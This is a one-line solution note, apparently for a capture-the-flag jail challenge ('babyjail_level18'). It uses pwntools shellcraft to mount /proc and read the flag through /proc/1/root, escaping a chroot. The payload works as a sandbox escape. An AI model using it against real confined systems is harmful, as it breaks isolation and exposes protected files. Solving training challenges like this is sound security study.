# Mount Bindmount
pwn shellcraft amd64.mkdir /proc + amd64.mount proc /proc proc 0 0 + amd64.cat /proc/1/root/flag | /challenge/babyjail_level18 /home/hacker